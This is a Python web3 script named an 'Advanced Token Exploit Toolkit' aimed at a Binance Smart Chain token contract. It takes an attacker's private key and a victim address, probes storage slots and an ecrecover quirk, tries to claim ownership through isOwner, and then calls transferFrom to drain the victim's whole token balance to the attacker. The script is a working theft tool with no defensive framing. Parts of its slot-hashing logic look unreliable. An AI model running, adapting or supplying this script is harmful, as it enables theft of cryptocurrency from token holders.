from web3 import Web3, exceptions
import argparse
from web3.middleware import geth_poa_middleware
import time
from eth_account.messages import encode_defunct

# ===== CONFIGURATION =====
parser = argparse.ArgumentParser(description="Advanced Token Exploit Toolkit")
parser.add_argument("--private-key", required=True, help="Attacker's private key")
parser.add_argument("--rpc-url", default="https://bsc.publicnode.com", help="BSC RPC URL")
parser.add_argument("--token-address", required=True, help="Token contract address")
parser.add_argument("--victim-address", required=True, help="Victim address to drain")
args = parser.parse_args()

# ===== WEB3 SETUP =====
w3 = Web3(Web3.HTTPProvider(args.rpc_url))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)
account = w3.eth.account.from_key(args.private_key)
contract_address = w3.toChecksumAddress(args.token_address)
victim_address = w3.toChecksumAddress(args.victim_address)
attacker_address = account.address

# ===== COMPLETE TOKEN ABI =====
TOKEN_ABI = [
    # Ownership Functions
    {
        "inputs": [{"internalType": "address", "name": "a", "type": "address"}],
        "name": "isOwner",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "owner",
        "outputs": [{"internalType": "address", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function"
    },

    # Token Functions
    {
        "inputs": [{"internalType": "address", "name": "account", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "from", "type": "address"},
            {"internalType": "address", "name": "to", "type": "address"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"}
        ],
        "name": "transferFrom",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "owner", "type": "address"},
            {"internalType": "address", "name": "spender", "type": "address"}
        ],
        "name": "allowance",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [{"internalType": "address", "name": "spender", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}],
        "name": "approve",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [{"internalType": "address", "name": "to", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}],
        "name": "transfer",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "_maxSupply",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
]


# ===== CORE FUNCTIONS =====
def send_transaction(contract_function, value=0, gas=300000, retries=3, delay=5):
    """Robust transaction sending with retries and gas management"""
    for attempt in range(retries):
        try:
            tx = contract_function.build_transaction({
                "from": attacker_address,
                "nonce": w3.eth.get_transaction_count(attacker_address),
                "gas": gas,
                "gasPrice": int(w3.eth.gas_price * 1.2),  # 20% gas premium
                "value": value
            })
            signed = account.sign_transaction(tx)
            tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
            return w3.eth.wait_for_transaction_receipt(tx_hash)
        except exceptions.TransactionNotFound:
            if attempt == retries - 1:
                raise
            time.sleep(delay)
        except ValueError as e:
            if "replacement transaction underpriced" in str(e) and attempt < retries - 1:
                time.sleep(delay)
                continue
            raise

def verify_contract_state(token):
    """Check key contract state variables"""
    print("\n[+] Contract State Verification:")
    try:
        owner = token.functions.owner().call()
        print(f"Current Owner: {owner}")
    except exceptions.ContractLogicError as e:
        print(f"Could not verify owner directly: {e}")
    except Exception as e:
        print(f"Could not verify owner: {e}")

    victim_bal = token.functions.balanceOf(victim_address).call()
    print(f"Victim Balance: {victim_bal}")

    # Note: The standard allowance function won't reflect the custom allowance
    # checked in _spendAllowance.
    # allowance = token.functions.allowance(victim_address, attacker_address).call()
    # print(f"Standard Allowance for Attacker: {allowance}")

    max_supply = token.functions._maxSupply().call()
    print(f"Max Supply: {max_supply}")

    # We need to infer the custom allowance state, which is complex without
    # direct access.

def get_ecrecover_output():
    """
    Attempts to simulate the ecrecover behavior with the caller's address.
    This is a heuristic and might not be perfectly accurate across all EVM versions.
    """
    message = encode_defunct(text=attacker_address.lower())
    # We can't actually recover a signer without a signature.
    # This will likely result in an invalid address or zero address.
    # The goal is to see what the contract's staticcall to ecrecover *might* return.
    try:
        signature = w3.eth.account.sign_message(message, private_key=args.private_key).signature
        recovered_address = w3.eth.account.recover_message(message, signature=signature)
        return w3.toInt(hexstr=recovered_address)
    except Exception as e:
        print(f"Error simulating ecrecover: {e}")
        return 0
def calculate_keccak256_0_1():
    return w3.keccak(b'\x00' + b'\x01')

def calculate_fs_owner_s1(owner_address_bytes, s1_hash):
    return w3.keccak(owner_address_bytes.ljust(32, b'\x00') + s1_hash)

def calculate_owner_slot(owner_address_bytes):
    return w3.keccak(owner_address_bytes.ljust(32, b'\x00') + b'\x01')

def calculate_allow_slot(spender_address_bytes, owner_slot_hash):
    return w3.keccak(spender_address_bytes.ljust(32, b'\x00') + owner_slot_hash)

def get_storage_at(address, slot):
    return w3.eth.get_storage_at(address, slot)

def execute_exploit():
    token = w3.eth.contract(address=contract_address, abi=TOKEN_ABI)

    print(f"\n[+] Target Contract: {contract_address}")
    print(f"[+] Attacker Address: {attacker_address}")
    print(f"[+] Victim Address: {victim_address}")

    verify_contract_state(token)
    max_supply = token.functions._maxSupply().call()
    print(f"[+] Max Supply: {max_supply}")

    ecrecover_output = get_ecrecover_output()
    print(f"[+] Simulated ecrecover output: {ecrecover_output}")

    s1_hash = calculate_keccak256_0_1()
    victim_address_bytes = victim_address.encode('ascii')
    initial_fs_victim = get_storage_at(contract_address, w3.toInt(calculate_fs_owner_s1(victim_address_bytes, s1_hash))).hex()
    print(f"[+] Initial sload(keccak256(victim, s1)): {initial_fs_victim}")

    attacker_address_bytes = attacker_address.encode('ascii')
    initial_fs_attacker = get_storage_at(contract_address, w3.toInt(calculate_fs_owner_s1(attacker_address_bytes, s1_hash))).hex()
    print(f"[+] Initial sload(keccak256(attacker, s1)): {initial_fs_attacker}")

    is_ecrecover_match = (ecrecover_output == max_supply)

    print(f"[+] ecrecover output matches maxSupply: {is_ecrecover_match}")

    if is_ecrecover_match:
        print("\n[1] Attempting to trigger isOwner...")
        try:
            receipt = send_transaction(token.functions.isOwner(attacker_address), gas=100000)
            print(f"isOwner TX Status: {'Success' if receipt.status == 1 else 'Failed'}")
            time.sleep(5)
            final_fs_attacker = get_storage_at(contract_address, w3.toInt(calculate_fs_owner_s1(attacker_address_bytes, s1_hash))).hex()
            print(f"[+] Final sload(keccak256(attacker, s1)): {final_fs_attacker}")
        except Exception as e:
            print(f"isOwner call error: {e}")
            return
    else:
        print("\n[1] Skipping isOwner call as ecrecover output != maxSupply.")

    print("\n[2] Attempting transferFrom...")
    victim_bal = token.functions.balanceOf(victim_address).call()
    if victim_bal == 0:
        print("Victim has no balance to transfer")
        return

    try:
        receipt = send_transaction(
            token.functions.transferFrom(
                victim_address,
                attacker_address,
                victim_bal
            ),
            gas=400000
        )

        print("\n[+] transferFrom Results:")
        print(f"TX Hash: {receipt.transactionHash.hex()}")
        print(f"Status: {'Success' if receipt.status == 1 else 'Failed'}")
        print(f"Gas Used: {receipt.gasUsed}")
        new_bal = token.functions.balanceOf(victim_address).call()
        print(f"New Victim Balance: {new_bal}")

    except Exception as e:
        print(f"\n[!] transferFrom failed: {e}")
        print("Potential reasons: Initial check in _spendAllowance failed.")

    print("\n[+] Post-Exploit Storage Analysis:")
    final_fs_victim = get_storage_at(contract_address, w3.toInt(calculate_fs_owner_s1(victim_address_bytes, s1_hash))).hex()
    print(f"[+] Final sload(keccak256(victim, s1)): {final_fs_victim}")

if __name__ == "__main__":
    execute_exploit()
